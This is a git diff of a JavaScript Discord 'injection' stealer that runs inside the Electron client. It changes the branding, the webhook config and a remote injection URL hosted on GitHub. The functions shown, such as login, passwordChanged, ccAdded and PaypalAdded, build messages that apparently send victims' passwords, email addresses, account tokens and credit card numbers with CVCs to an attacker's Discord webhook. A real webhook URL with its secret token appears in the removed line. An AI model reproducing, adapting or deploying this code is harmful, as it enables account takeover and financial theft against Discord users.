@@ -6,15 +6,15 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '', 
-  webhook_protector_key: 'https://discord.com/api/webhooks/1150433241644421181/c1Jll4aeA15sqMGTnwy2Y5s7hVOHfCTYP1DE0FOkwC0PgBKsDdjhbpXYBZhxe35061pK', 
+  webhook: '%WEBHOOK%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'DRAX Injection', 
   embed_icon: 'https://cdn.discordapp.com/avatars/740676427602591764/97b66df7f22b94192d051bfb87652c03.png?size=1024'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Hassantk343/injection1/main/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Shadow132245/injection1/main/injection/main/index.js', 
   /**
    
    **/
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW & ☇𝗞𝟭・',
+          text: '🎉・Discord Injection By Drax',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By DRAX・',
+          text: '🎉・Discord Injection By Drax',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By DRAX・',
+          text: '🎉・Discord Injection By Drax',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By DRAX・',
+          text: '🎉・Discord Injection By Drax',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By DRAX・',
+          text: '🎉・Discord Injection By Drax',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By DRAX・',
+          text: '🎉・Discord Injection By Drax',
         },
       },
     ],
